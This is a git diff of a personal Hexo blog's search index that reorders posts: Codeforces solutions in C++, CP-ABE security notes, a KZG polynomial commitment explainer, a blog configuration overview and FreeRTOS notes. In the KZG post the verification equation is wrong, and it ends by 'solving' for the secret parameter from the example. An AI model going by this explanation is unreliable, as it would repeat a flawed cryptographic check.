2bdb98e33067f74c8266072e51f79ba40d567e896fb7ac5ed97c1c55c538dcfa7336c2df5abd117f20e256e938f766dd012866f28ed6cf26140dbde556984cf0cc89f02e67eb666ab7609f3a799ed0e51dc05f61884d8cd5f80c017e4624fa0ce778c7d13d33f36f7c0b8ed1151e21a0d3b6ae9749a686905adb14ad1d4ae30a7290abaa8a1c6c648fc9b72582821a64f38abedffddfe089095f0c9ab091c0173b4f7448cd99ae6d01f6fa58acfe9bb78d10ae5805b14118b82536b6e9bc87b08a1f7ff78ce4acd1ec5a178f590b4604929907a4acc85fd62be5ee2b27b8caf875996e1a9f18da998a2e017c7888b63a298912ac91f7ad85523f6096d61ef4430c897b2dd2e0b1fc52b19e958013c24c8f9a80ae37b849895a89151a6b78ad7242d36db0045ec213d9e0bf945d2cac37a9013561f3dda9c07b76c7486e9d19ea18e08c905941d001a81490b72ab3803f049094031ee962eeb03e32185b088951a78153fc67ff5a41defb641ba4db2e8ff1d26275cf1c9878e98b54b251cbfd2006245e4cce71e6fae08f7536a22334aff3e9431095975f55f3dc18a05e7bc75dba5d395d7b4d35b6715822492cc14ca478eed0510079c26056f5c0a3a34a7396c1bcf8fa492796fc4aae7c5444ddf0265129091cccc466501c7cb1531579ae0184273d14d6e33a16626f6f26f88cea3f347fadbbe7fcb5e33bb4de2bd10f99a991b9044f823ddc8948cbc8898af1680d03cac325afedac8a4ed61ec8c78227a8af4d565f727cc46a1d94562c162cc82b50b1057bd05f18e9e9e93aad91e93b9834c8c37f1d7b055ebcc319c7a80fac256ee3172197fc09913c1bda1c132be59676560fc7273bcc1294a12f9cb961bd70552de074c7270098d03a0ea1c002c4f62c14e9c856cfd2266f59468b8ee06092219565f493698c336d6ed25ff14785fa13be693f6fcd08977b10e7efe7605ac61e5ffdabdc7a65add8d626dc72675a6c03a673063ad4514b5240b031345b854c4c385285ceb385b67
+  
+    
+      
+      
+        Hey, password is required here.
+      
+    
+  
+
+]]></content>
+      <categories>
+        <category>会议竞赛游记</category>
+      </categories>
+      <tags>
+        <tag>游记</tag>
       </tags>
   </entry>
   <entry>
@@ -1229,6 +1194,41 @@ What’s are the implication
       <tags>
         <tag>Crypto</tag>
         <tag>unfixed</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CF补题小合集</title>
+    <url>/2025/01/19/CF%E8%A1%A5%E9%A2%98%E5%B0%8F%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[由于后续CF比赛基本只参加VP，故特此记录一下
+
+
+2025.01.17Codeforces Round 996 (Div. 2)
+这把打爽了，表现分差点上紫，D题最后一分钟调出来过样例 结果WA2了
+
+C题构造题
+我们从(1,1)开始思考，假设场景是这样的
+
+设每行每列的和都为$S$，故(1,1)的数值和$S$的大小成线性关系
+也就是说，知道$S$就能通过这一行的数求出(1,1)的数值（如蓝色所示）
+
+同理，知道$S$就能求出第二行的数值（如紫色所示）
+
+按顺序（沿路径）向下递推，就必然可以计算出下一个方格的数据（如红色所示）
+
+故得出结论：如果该位置的下一个是R，则通过列计算；否则通过行计算
+但是$S$还不知道哇~
+梅瓜吸，$S$是多少都可以，我直接让它是0（更正式的，由$x+1$个未知数的$x$个方程构成的方程组中，存在一个自由量，这个自由量可以是S；其中$x=n+m-2$）
+#include&lt;iostream&gt;#define int long longusing namespace std;const int N = 1e3;int n , m;int a[N+10][N+10];string s;signed main()&#123;    int t;cin &gt;&gt; t;    while( t -- )&#123;        cin &gt;&gt; n &gt;&gt; m &gt;&gt; s;        for(int i = 1;i &lt;= n;i ++)&#123;            for(int j = 1;j &lt;= m;j ++)&#123;                cin &gt;&gt; a[i][j];            &#125;        &#125;        int x , y;x = y = 1;        for(int p = 0,i,j;p &lt; s.length();p ++)&#123;            if( s[p] == &#x27;D&#x27; )&#123;                for(j = 1;j &lt;= m;j ++)&#123;                    if( j == y ) continue;                    a[x][y] += a[x][j];                &#125;a[x][y] = -a[x][y];                x ++;            &#125;            if( s[p] == &#x27;R&#x27; )&#123;                for(i = 1;i &lt;= n;i ++)&#123;                    if( i == x ) continue;                    a[x][y] += a[i][y];                &#125;a[x][y] = -a[x][y];                y ++;            &#125;        &#125;        for(int j = 1;j &lt; m;j ++) a[n][m] += a[n][j];        a[n][m] = -a[n][m];        for(int i = 1;i &lt;= n;i ++)&#123;            for(int j = 1;j &lt;= m;j ++)&#123;                cout &lt;&lt; a[i][j] &lt;&lt; &quot; &quot;;            &#125;cout &lt;&lt; endl;        &#125;    &#125;return 0;&#125;
+D题不容易的思维题，不过只要逻辑理清楚了，都很简单
+考虑以下策略仅考虑两个相邻的点如果二者的距离小于k，则可以直接越过去，a[i]的值尽可能的大如果二者的距离大于k但是小于k+已过去的时间，则右侧点有能力移动到a[i-1]+k，也不需要额外消耗时间如果二者的距离大于k+已过去的时间，则右侧点应当从一开始就开始全力左移，并二者相向而行，代价是相向而行的时间
+值得注意的是，long double最后要转成long long不然输出的可能是科学计数法（WA6）
+#include&lt;iostream&gt;#define int long longusing namespace std;const int N = 2e5;int n , k , l;long double ans , time_now;long double a[N+10];signed main()&#123;    int t;cin &gt;&gt; t;    while( t -- )&#123;ans = 0;        cin &gt;&gt; n &gt;&gt; k &gt;&gt; l;        for(int i = 1;i &lt;= n;i ++) cin &gt;&gt; a[i];        ans += a[1]*2;        time_now = a[1];        a[1] = 0;        for(int i = 2;i &lt;= n;i ++)&#123;            if( a[i] - a[i-1] &gt; k )&#123;                if( a[i] - a[i-1] &gt; k + time_now )&#123;                    a[i] -= time_now;                    ans += (a[i] - a[i-1] - k);                    time_now += (a[i] - a[i-1] - k)/2;                    a[i] -= (a[i] - a[i-1] - k) / 2;                &#125;else&#123;                    a[i] = a[i-1] + k;                &#125;            &#125;else&#123;                a[i] = min( a[i-1] + k , a[i] + time_now );            &#125;        &#125;        ans += max( (l - a[n] - k )*2 , (long double)0 );        cout &lt;&lt; (long long)ans &lt;&lt; endl;    &#125;return 0;&#125;
+]]></content>
+      <categories>
+        <category>算法竞赛</category>
+      </categories>
+      <tags>
+        <tag>算法竞赛</tag>
       </tags>
   </entry>
   <entry>
@@ -1483,6 +1483,31 @@ G.这题我也不知道怎么过的，应该是运气好凑巧了吧
       </tags>
   </entry>
   <entry>
+    <title>IND-CCA2下的CP-ABE安全</title>
+    <url>/2025/01/07/IND-CCA2%E4%B8%8B%E7%9A%84CP-ABE%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[今天阅读前置知识，搞了半天终于明白了IND-CCA2下的CP-ABE安全，记录一下
+
+
+论文名称：Fine-Grained and Controlled Rewriting in Blockchains: Chameleon-Hashing Gone Attribute-Based
+相关内容：
+
+
+我们只看核心部分
+
+我们大致划分为三个部分
+第一部分，初始化，不再赘述
+第二部分，攻击者交互阶段，攻击者$\mathcal{A}$选择任意属性集合$\mathbb{S}$进行请求，模拟器会这些请求的属性集合加入全局集合$S$，并生成与属性集合$\mathbb{S}$相对应的私钥$ssk$，将请求编号及生成的密钥记录到$Q$中
+第三部分，挑战阶段，攻击者$\mathcal{A}$提供属性集合$A^{}$ （$A^{}\cap S=\emptyset$），模拟器随机选择$b\in{0,1}$，使用属性集合$A^*$对应的私钥加密$m_b$，将密文$c_b$提供给$\mathcal{A}$ 
+如果攻击者$\mathcal{A}$能够通过交互获得的信息区分密文中加密的是$m_0$还是$m_1$，且成功的概率显著大于$\frac12$，则认为攻击者成功，算法被攻破，否则认为该加密方案满足IND-CCA2安全性
+]]></content>
+      <categories>
+        <category>科研</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IELTS备考方案</title>
     <url>/2024/12/13/IELTS%E5%A4%87%E8%80%83%E6%96%B9%E6%A1%88/</url>
     <content><![CDATA[记录如何备考雅思
@@ -1508,31 +1533,6 @@ G.这题我也不知道怎么过的，应该是运气好凑巧了吧
       </categories>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IND-CCA2下的CP-ABE安全</title>
-    <url>/2025/01/07/IND-CCA2%E4%B8%8B%E7%9A%84CP-ABE%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[今天阅读前置知识，搞了半天终于明白了IND-CCA2下的CP-ABE安全，记录一下
-
-
-论文名称：Fine-Grained and Controlled Rewriting in Blockchains: Chameleon-Hashing Gone Attribute-Based
-相关内容：
-
-
-我们只看核心部分
-
-我们大致划分为三个部分
-第一部分，初始化，不再赘述
-第二部分，攻击者交互阶段，攻击者$\mathcal{A}$选择任意属性集合$\mathbb{S}$进行请求，模拟器会这些请求的属性集合加入全局集合$S$，并生成与属性集合$\mathbb{S}$相对应的私钥$ssk$，将请求编号及生成的密钥记录到$Q$中
-第三部分，挑战阶段，攻击者$\mathcal{A}$提供属性集合$A^{}$ （$A^{}\cap S=\emptyset$），模拟器随机选择$b\in{0,1}$，使用属性集合$A^*$对应的私钥加密$m_b$，将密文$c_b$提供给$\mathcal{A}$ 
-如果攻击者$\mathcal{A}$能够通过交互获得的信息区分密文中加密的是$m_0$还是$m_1$，且成功的概率显著大于$\frac12$，则认为攻击者成功，算法被攻破，否则认为该加密方案满足IND-CCA2安全性
-]]></content>
-      <categories>
-        <category>科研</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -1606,79 +1606,6 @@ $f(n)$
       </categories>
       <tags>
         <tag>算法竞赛</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PCS简要介绍</title>
-    <url>/2025/03/26/PCS%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[之前听师兄讲PCS（多项式承诺方案），听不懂一点，甚至有一次差点睡着（bushi
-今天看Siniel，又遇到PCS了，故而通俗理解记录一下，也没时间看相关论文了~浅学一下，够用即可~~
-
-
-
-Motivation：证明者有一个多项式 $p()$，验证者指定一个数 $z$ 来验证，通过承诺确保原多项式不会改变
-
-这里，我们介绍 KZG。更具体的：
-KZG 方案是基于双线性对（bilinear pairing）和加法同态加密（homomorphic encryption）的密码学技术。它允许一个发送方承诺（commit）一个多项式，并稍后提供证明（proof），以便验证者确认多项式在某个点的值是否正确。
-前置知识：双线性映射
-
-设 $G_1,G_2$ 是两个循环群，阶为素数 $p$
-设 $e:G_1\times G_2\rightarrow G_T$，满足 $e(g^a,h^b)=e(g,h)^{ab}$ 对所有 $a,b\in\mathbb{Z}_p$ 成立，其中 $g,h$ 是群 $G_1$ 和 $G_2$ 的生成元
-
-KGC的四个步骤：（对应图二）
-
-Setup（设置）： 生成公钥参数。
-Commit（承诺）： 证明者使用私有多项式生成并公开该多项式的承诺。
-Open（打开）： 验证者指定在某个点，而后要求证明者公开该多项式的值并提供一个证明。
-Verify（验证）： 验证者检查提交的值和证明是否有效。
-
-
-具体流程2.1 设定（Setup）
-由可信第三方（或 MPC ）选取一个私有值 $s$，并计算：${ g, g^s, g^{s^2}, \dots, g^{s^d} }$ 作为公共参数；这些值是椭圆曲线群上的元素并公开发布。
-2.2 承诺（Commit）
-证明者需验证多项式 $p(x) = a_0 + a_1 x + a_2 x^2 + \dots + a_d x^d$
-计算并公开承诺 $C_p = g^{p(s)} = g^{a_0 + a_1 s + a_2 s^2 + \dots + a_d s^d}$
-2.3 证明（Open）
-验证者想知道证明者的多项式在 $x = \alpha$ 处的值 $y = p(\alpha)$
-证明者计算商多项式：$q(x) = \frac{p(x) - p(\alpha)}{x - \alpha}$；因为 $p(x) - p(\alpha)$ 可被 $x - \alpha$ 整除，所以 $q(x)$ 是一个比 $p(x)$ 低 1 阶的多项式。
-计算承诺 $C_q$：$C_q = g^{q(s)}$；并将其作为证明 $\pi = C_q$ 发送给验证者。
-2.4 验证（Verify）
-验证者通过以下等式检查证明是否有效：$e(C_p / g^y, g) = e(\pi, g^{\alpha})$
-即：$e(g^{p(s) - y}, g) = e(g^{q(s)}, g^{\alpha})$
-若等式成立，则说明证明者提供的 $y = p(\alpha)$ 是正确的。
-
-示例①设公共参数为：$g, g^s, g^{s^2}, g^{s^3}, \dots$
-②证明者私有多项式：$p(x) = 3x^2 + 2x + 5$
-计算承诺并将其公开：$C_p = g^{5 + 2s + 3s^2}$
-③验证者指定一个点：$z=2$
-证明者计算:$p(2) = 3(2)^2 + 2(2) + 5 = 17$
-证明者计算商多项式:$q(x) = \frac{(3x^2 + 2x + 5) - 17}{x - 2} = 3x + 8$
-证明者计算证明：$\pi = g^{q(s)} = g^{3s + 8}$
-④验证者执行验证：$e(C_p / g^{17}, g) = e(g^{3s + 8}, g^2)$
-如果等式成立，则证明 $ p(2) = 17 $ 是正确的。
-
-进一步的，关于验证阶段验证者需要验证 $e(C_p / g^{17}, g) = e(g^{3s + 8}, g^2)$ 是否成立
-
-\begin{align}
-左式=&e(C_p / g^{17}, g)\\
-=&e(g^{(5 + 2s + 3s^2) - 17},g) \\
-=&e(g^{3s^2 + 2s - 12},g)\\
-=&e(g, g)^{(3s^2 + 2s - 12)}
-\end{align}
-\begin{align}
-右式=&e(g^{3s + 8}, g^2)\\
-=& e(g, g)^{6s + 16}
-\end{align}故只需 $3s^2 + 2s - 12=6s + 16$ 成立，则验证通过
-此时 $s=\frac{2 \pm \sqrt{88}}{3}$ （此过程为逆向过程）
-即最一开始的公开参数 $s=\frac{2 \pm \sqrt{88}}{3}$ 时，则 $e(C_p / g^{17}, g) = e(g^{3s + 8}, g^2)$ 成立，证明通过
-后记：补充说明和上面的算法相呼应，在论文的后半部分找到的具体算法，本质相同
-
-]]></content>
-      <categories>
-        <category>科研</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -1834,6 +1761,79 @@ ImageCloud前置垫刀之路02: 普通的文件上传]]></content>
       </categories>
       <tags>
         <tag>cryptoCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PCS简要介绍</title>
+    <url>/2025/03/26/PCS%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[之前听师兄讲PCS（多项式承诺方案），听不懂一点，甚至有一次差点睡着（bushi
+今天看Siniel，又遇到PCS了，故而通俗理解记录一下，也没时间看相关论文了~浅学一下，够用即可~~
+
+
+
+Motivation：证明者有一个多项式 $p()$，验证者指定一个数 $z$ 来验证，通过承诺确保原多项式不会改变
+
+这里，我们介绍 KZG。更具体的：
+KZG 方案是基于双线性对（bilinear pairing）和加法同态加密（homomorphic encryption）的密码学技术。它允许一个发送方承诺（commit）一个多项式，并稍后提供证明（proof），以便验证者确认多项式在某个点的值是否正确。
+前置知识：双线性映射
+
+设 $G_1,G_2$ 是两个循环群，阶为素数 $p$
+设 $e:G_1\times G_2\rightarrow G_T$，满足 $e(g^a,h^b)=e(g,h)^{ab}$ 对所有 $a,b\in\mathbb{Z}_p$ 成立，其中 $g,h$ 是群 $G_1$ 和 $G_2$ 的生成元
+
+KGC的四个步骤：（对应图二）
+
+Setup（设置）： 生成公钥参数。
+Commit（承诺）： 证明者使用私有多项式生成并公开该多项式的承诺。
+Open（打开）： 验证者指定在某个点，而后要求证明者公开该多项式的值并提供一个证明。
+Verify（验证）： 验证者检查提交的值和证明是否有效。
+
+
+具体流程2.1 设定（Setup）
+由可信第三方（或 MPC ）选取一个私有值 $s$，并计算：${ g, g^s, g^{s^2}, \dots, g^{s^d} }$ 作为公共参数；这些值是椭圆曲线群上的元素并公开发布。
+2.2 承诺（Commit）
+证明者需验证多项式 $p(x) = a_0 + a_1 x + a_2 x^2 + \dots + a_d x^d$
+计算并公开承诺 $C_p = g^{p(s)} = g^{a_0 + a_1 s + a_2 s^2 + \dots + a_d s^d}$
+2.3 证明（Open）
+验证者想知道证明者的多项式在 $x = \alpha$ 处的值 $y = p(\alpha)$
+证明者计算商多项式：$q(x) = \frac{p(x) - p(\alpha)}{x - \alpha}$；因为 $p(x) - p(\alpha)$ 可被 $x - \alpha$ 整除，所以 $q(x)$ 是一个比 $p(x)$ 低 1 阶的多项式。
+计算承诺 $C_q$：$C_q = g^{q(s)}$；并将其作为证明 $\pi = C_q$ 发送给验证者。
+2.4 验证（Verify）
+验证者通过以下等式检查证明是否有效：$e(C_p / g^y, g) = e(\pi, g^{\alpha})$
+即：$e(g^{p(s) - y}, g) = e(g^{q(s)}, g^{\alpha})$
+若等式成立，则说明证明者提供的 $y = p(\alpha)$ 是正确的。
+
+示例①设公共参数为：$g, g^s, g^{s^2}, g^{s^3}, \dots$
+②证明者私有多项式：$p(x) = 3x^2 + 2x + 5$
+计算承诺并将其公开：$C_p = g^{5 + 2s + 3s^2}$
+③验证者指定一个点：$z=2$
+证明者计算:$p(2) = 3(2)^2 + 2(2) + 5 = 17$
+证明者计算商多项式:$q(x) = \frac{(3x^2 + 2x + 5) - 17}{x - 2} = 3x + 8$
+证明者计算证明：$\pi = g^{q(s)} = g^{3s + 8}$
+④验证者执行验证：$e(C_p / g^{17}, g) = e(g^{3s + 8}, g^2)$
+如果等式成立，则证明 $ p(2) = 17 $ 是正确的。
+
+进一步的，关于验证阶段验证者需要验证 $e(C_p / g^{17}, g) = e(g^{3s + 8}, g^2)$ 是否成立
+
+\begin{align}
+左式=&e(C_p / g^{17}, g)\\
+=&e(g^{(5 + 2s + 3s^2) - 17},g) \\
+=&e(g^{3s^2 + 2s - 12},g)\\
+=&e(g, g)^{(3s^2 + 2s - 12)}
+\end{align}
+\begin{align}
+右式=&e(g^{3s + 8}, g^2)\\
+=& e(g, g)^{6s + 16}
+\end{align}故只需 $3s^2 + 2s - 12=6s + 16$ 成立，则验证通过
+此时 $s=\frac{2 \pm \sqrt{88}}{3}$ （此过程为逆向过程）
+即最一开始的公开参数 $s=\frac{2 \pm \sqrt{88}}{3}$ 时，则 $e(C_p / g^{17}, g) = e(g^{3s + 8}, g^2)$ 成立，证明通过
+后记：补充说明和上面的算法相呼应，在论文的后半部分找到的具体算法，本质相同
+
+]]></content>
+      <categories>
+        <category>科研</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -2239,313 +2239,6 @@ https://documents.uow.edu.au/~fuchun/jow/011-QAXEDWBAMA.pdf
       </categories>
       <tags>
         <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客技术与功能概览</title>
-    <url>/2025/10/22/blog-tech-overview/</url>
-    <content><![CDATA[一、总体概览
-平台与框架：Hexo 7.3.0 + Butterfly 主题（v5.3.5）。
-站点定位：技术学习/竞赛记录（密码学/CTF/算法/课程笔记等）+ 生活随笔，中文为主。
-展示风格：卡片式列表、顶部大图 Banner、封面图轮换、侧栏多卡片信息（作者、公告、最新评论、归档、标签云、站点信息）。
-交互增强：本地搜索、目录（TOC）、相关文章、阅读模式、深色模式切换、PJAX 页面切换、Instant.page 预获取、图片灯箱（medium-zoom）。
-评论与统计：Waline（含 PV/UV）+ Disqus 双系统（Waline 为主），文章卡片显示评论数；站点 PV/UV 未启用 Busuanzi（保留为可选）。
-多媒体：底部固定 APlayer 播放器（inject 注入）+ 音乐页 aplayerlist 播放清单。
-数学与代码：MathJax 渲染公式，highlight.js 高亮，行号与自动换行启用。
-
-二、技术栈与版本
-Hexo: 7.3.0（package.json hexo 字段与依赖）
-主题：hexo-theme-butterfly 5.3.5（themes/butterfly/）
-渲染器：
-@upupming/hexo-renderer-markdown-it-plus（当前 Markdown 渲染主力）
-hexo-renderer-kramed（亦已安装，存在并行可能的冗余，见改进建议）
-hexo-renderer-stylus、hexo-renderer-pug
-
-
-生成/功能插件（节选）：
-搜索：hexo-generator-search、hexo-generator-searchdb（两者同时存在，见改进建议）
-站点生成：hexo-generator-index、archive、category、tag
-部署：hexo-deployer-git
-开发：hexo-server
-统计/字数：hexo-wordcount
-资源与多媒体：hexo-asset-image、hexo-tag-aplayer
-加密（可选）：hexo-blog-encrypt（暂未启用）
-主题内置/集成：pjax、instant.page、medium-zoom、canvas-nest、snackbar 等
-
-
-其他：@vercel/analytics 已安装但未在主题注入中显式启用。
-
-三、核心目录结构（简要）
-根配置
-_config.yml：站点全局配置（URL、构建、部署、数学、搜索、高亮、文章资源等）。
-_config.butterfly.yml：主题配置（导航、封面、UI、交互、评论、统计、特效等）。
-
-
-内容与数据
-source/_posts/：文章 Markdown（数量多，覆盖技术、竞赛、随笔等）。
-source/_data/link.yml：友链数据，按分类展示。
-source/link/index.md：友链页（type: link）。
-source/tags/index.md：标签页（type: tags）。
-source/music/index.md：音乐页（type: music，使用 aplayerlist）。
-source/schedule/index.md：常驻更新目录页（手工索引若干文章）。
-
-
-主题目录
-themes/butterfly/：主题源码、静态资源与内置脚本（包含本地搜索脚本）。
-
-
-
-四、主题与 UI 关键设置
-导航与菜单
-LOGO：/img/niu.gif
-菜单项：主页、时光轴（archives）、标签、友链
-顶部 Banner：index_img 与 default_top_img 均指向 /img/*.jpg|gif，默认封面集较大（94 张 gif）。
-
-
-列表与封面
-首页布局 index_layout: 3（封面与信息左右交错），简介展示长度 500。
-封面/侧栏/归档 cover 开启；aside 启用且默认在左侧。
-
-
-代码块
-主题 code_blocks: light、Mac 风格标题、可复制、行内换行。
-Hexo 使用 highlight.js（行号、wrap）。
-
-
-文章页
-TOC：开启且带序号、滚动百分比显示。
-版权信息：开启，协议为 CC BY-NC-SA 4.0。
-相关文章：开启，最多 6 篇。
-上/下一篇分页：顺序模式 1。
-
-
-侧栏卡片（已启用）
-作者卡片（Follow Me 指向 GitHub）
-公告（维护日志提示）
-最近文章（按更新时间）
-最新评论（Waline 聚合）
-分类/标签云/归档（月度）
-站点信息（文章数、最近推送时间、运行时长可配置）
-
-
-交互与视觉
-深色模式：按钮切换，手动模式。
-阅读模式：支持。
-PJAX：开启；Instant.page：开启；进入过渡动画：开启。
-图片灯箱：medium-zoom；Lightbox 在主题中设置为 medium_zoom。
-背景特效：canvas-nest（开启，移动端关闭），click_heart（开启）。
-Snackbar：开启；位置左下。
-
-
-
-五、功能清单（结合插件与配置）1) 搜索
-
-主题：local_search（占位文案“来搜吧来搜吧~”）。
-生成器：root _config.yml 配置 search.xml；同时安装了 search 与 searchdb 两个插件（建议二选一）。
-
-2) 评论与访问统计
-
-Waline：已配置 serverURL（Vercel 部署后端），开启 pageview &amp; visitor 统计；首页文章卡片展示评论数与 PV。
-Disqus：配置了 shortname，可作为备份/次要评论系统。
-站点级 PV/UV：Busuanzi 在主题配置中注释关闭（可按需启用）。
-
-3) 数学公式
-
-MathJax：在主题与站点均开启，单美元行内启用；engine 设为 chtml；支持按页面 Front-matter 控制。
-
-4) 代码高亮
-
-highlight.js：行号、自动换行、wrap 开启；主题 code_blocks=light。
-
-5) 多媒体与音乐
-
-页面级：source/music/index.md 使用 &#123;% aplayerlist %&#125; 播放清单。
-全站固定：通过主题 inject.bottom 注入 APlayer 与播放列表（随机播放、固定底部、自动播放）。
-
-6) 内容组织与导航
-
-TOC、相关文章、上一/下一篇导航、归档（月度）、标签云（随机顺序、上限 40）。
-友链：source/_data/link.yml 维护，主题友链样式为 volantis。
-
-7) 性能与体验
-
-PJAX、Instant.page 预获取、medium-zoom、snackbar；Lazyload 暂未启用。
-
-8) SEO 与结构化数据
-
-Open Graph：开启；结构化数据：开启。
-尚未安装/配置 RSS（feed）与 sitemap（站点地图）插件（见改进建议）。
-
-9) 安全与加密
-
-hexo-blog-encrypt 已安装，root _config.yml 示例配置注释存在；MathJax 跳过 encrypted/** 渲染；当前未启用文章加密。
-
-10) 部署与运维
-
-部署：hexo-deployer-git 推送到 git@github.com:coperlm/coperlm.github.io.git 的 main 分支。
-文章资源：post_asset_folder: true + hexo-asset-image，便于相对路径插图。
-
-六、构建、开发与部署
-本地开发（PowerShell）
-# 一次性安装依赖npm install# 本地预览（默认 http://localhost:4000）npm run server# 清理与重新生成npm run clean; npm run build# 部署（需已配置 SSH Key 并具备仓库写权限）npm run deploy
-
-新文档与资源组织
-
-新文章：hexo new &quot;标题&quot;（或直接在 source/_posts/ 下添加 .md）。
-文章素材：置于与文章同名的资源目录（post_asset_folder=true），图片可用相对路径引用。
-友链：编辑 source/_data/link.yml。
-专题页：tags/link/music/schedule 等页面通过 source/&lt;page&gt;/index.md + Front-matter 管理。
-
-
-
-七、性能与可用性观察
-优点
-
-PJAX + Instant.page 使页面切换与首次交互更敏捷。
-TOC/相关文章/阅读模式/深色模式增强了长文可读性与导航性。
-APlayer 固定播放器提升沉浸感（需注意流量与带宽）。
-
-
-关注点
-
-封面图/默认图较多（近百张 gif），首页首屏资源体量可能较大；建议按需精简或延迟加载。
-Lazyload 关闭：在多图文章/长列表页会影响 FCP/LCP，可考虑开启主题 lazyload 或采用现代原生 lazy 属性。
-canvas-nest、click-heart 等特效在低端设备上可能影响帧率；移动端已禁用 nest，较为稳妥。
-
-
-
-八、安全与隐私
-Waline（自建/托管后端）
-已启用匿名评论与 PV/UV 统计；建议在 Waline 后端开启基础反垃圾与速率限制，关注数据合规性。
-
-
-Disqus
-作为备份评论系统；注意其隐私政策与被墙风险。
-
-
-加密文章
-已具备能力但未启用；如需发布敏感内容，可启用 hexo-blog-encrypt 并为分类/标签设置访问密码。
-
-
-
-九、问题与改进清单（可执行）1) Markdown 渲染器冗余
-
-同时安装了 markdown-it-plus 与 kramed；建议只保留一个（推荐 markdown-it-plus），并移除 hexo-renderer-kramed 与 root 中的 kramed: 配置，以避免行为不一致。
-
-2) 搜索插件重复
-
-hexo-generator-search 与 hexo-generator-searchdb 同时存在；推荐仅保留一个：
-若主题 local_search 读取 search.xml，保留 hexo-generator-search；
-或改为使用 searchdb（生成 search.json），并在主题中对应配置。
-
-
-
-3) SEO 能力完善
-
-增加 RSS 与站点地图：
-hexo-generator-feed（RSS/Atom）
-hexo-generator-sitemap（sitemap.xml）
-
-
-
-4) 统计与分析
-
-如需更细化的访问分析，可启用：
-Vercel Analytics（已安装包，需在主题 head/bottom 注入脚本）
-或 Umami/GA4/Clarity 等（主题已预留配置项）。
-
-
-
-5) 性能优化
-
-开启图片 Lazyload；
-精简默认封面 GIF 数量或改用静态 WebP；
-评估 APlayer 自动播放策略（移动端/低速网络条件下可考虑关闭自动播放）。
-
-6) PWA 与离线
-
-如有离线访问/安装到桌面的诉求，可启用主题 pwa 并补齐 manifest 与图标资源。
-
-7) 代码高亮统一性
-
-当前使用 highlight.js；若希望与 Butterfly 内置 Prism 生态更一致，可切换至 Prism 并开启按需加载（权衡体积与功能）。
-
-十、快速问答（FAQ）
-本地搜索无结果？
-
-确认运行了 hexo generate 生成 search.xml|json；若装了两个搜索生成器，保留一个并与主题配置一致。
-
-
-文章公式不渲染？
-
-确认 Front-matter 未关闭 mathjax；加密路径（encrypted/**）默认跳过渲染。
-
-
-图片 404 或不显示？
-
-使用 post_asset_folder: true 时，建议将图片放在与文章同名的资源目录下并用相对路径引用；主题 error_img 会为断图提供默认占位图。
-
-
-评论数/访客数未显示？
-
-检查 Waline serverURL 可用性与跨域设置，确认主题 comments.count/pageview 已启用；首页卡片统计需等待首批上报后才会有值。
-
-
-
-十一、结论该博客以 Butterfly 为基础，完成了从内容到交互的较完整搭建：
-
-对技术内容（数学、密码学、算法）有友好的公式/代码支持与导航增强；
-评论、搜索、多媒体与视觉动效到位，使用体验较好；
-在 SEO、性能与插件冗余方面仍有可量化的优化空间（RSS/Sitemap、Lazyload、渲染器与搜索插件精简）。
-
-]]></content>
-      <categories>
-        <category>技术学习笔记</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hal库c6t6 Freerots</title>
-    <url>/2024/11/08/hal%E5%BA%93c6t6-Freerots/</url>
-    <content><![CDATA[写篇博客，不为别的，就怕以后忘了咋整了
-Freerots这玩意忒好用了
-
-如何开FreerotsSYS这边选个时钟
-
-然后如图一路选下来，别忘了添加任务
-
-其他的常规配置，然后生成代码就可以了
-打开freertos.c文件，正常加入点灯代码就可以了
-
-以上内容的参考：
-https://www.cnblogs.com/Meiyangyang945/p/15106513.html
-
-报错1
-买不起好芯片，内存不够
-改一下代码里的内容
-将#define configTOTAL_HEAP_SIZE                    ((size_t)10240)
-修改为#define configTOTAL_HEAP_SIZE                    ((size_t)(1024*5)即可
-参考：
-https://blog.csdn.net/king110108/article/details/110038173
-https://file.elecfans.com/web2/M00/9B/99/pYYBAGQip7KAOU2vAAfDySG_a10157.pdf
-报错2
-一大堆啥玩意哇
-贴搜索引擎一看，是cpp导致的
-
-魔术棒中把misc_controls的--cpp11去掉即可
-参考：
-https://blog.csdn.net/timberman666/article/details/132723352
-报错3数日之后，又出现了报错2的内容
-改成多少都没用了
-开O2优化即可
-]]></content>
-      <categories>
-        <category>电控</category>
-      </categories>
-      <tags>
-        <tag>RoboMaster</tag>
       </tags>
   </entry>
   <entry>
@@ -3073,6 +2766,313 @@ flag:utflag&#123;d4nger0us_c1pherText_qq&#125;
       </categories>
       <tags>
         <tag>cryptoCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客技术与功能概览</title>
+    <url>/2025/10/22/blog-tech-overview/</url>
+    <content><![CDATA[一、总体概览
+平台与框架：Hexo 7.3.0 + Butterfly 主题（v5.3.5）。
+站点定位：技术学习/竞赛记录（密码学/CTF/算法/课程笔记等）+ 生活随笔，中文为主。
+展示风格：卡片式列表、顶部大图 Banner、封面图轮换、侧栏多卡片信息（作者、公告、最新评论、归档、标签云、站点信息）。
+交互增强：本地搜索、目录（TOC）、相关文章、阅读模式、深色模式切换、PJAX 页面切换、Instant.page 预获取、图片灯箱（medium-zoom）。
+评论与统计：Waline（含 PV/UV）+ Disqus 双系统（Waline 为主），文章卡片显示评论数；站点 PV/UV 未启用 Busuanzi（保留为可选）。
+多媒体：底部固定 APlayer 播放器（inject 注入）+ 音乐页 aplayerlist 播放清单。
